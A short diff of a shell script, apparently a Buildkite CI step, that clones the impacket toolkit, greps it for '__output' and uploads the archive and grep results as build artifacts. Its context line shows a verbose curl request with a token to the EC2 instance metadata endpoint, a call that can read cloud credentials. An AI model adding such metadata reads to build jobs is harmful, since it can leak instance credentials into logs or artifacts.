@@ -13,13 +13,17 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta
 #fetch repo
 
 WORK_DIR=`mktemp -d -p "/tmp"`
+RES='grep_results.txt'
 
 git clone https://github.com/fortra/impacket.git "$WORK_DIR"
 
 tar -zcvf /tmp/artifacts.tar.gz "$WORK_DIR"
 
+grep -irn "__output" $WORK_DIR > $RES
+
 rm -rf "$WORK_DIR"
 
 buildkite-agent artifact upload /tmp/artifacts.tar.gz
+buildkite-agent artifact upload $RES
 
 rm /tmp/artifacts.tar.gz
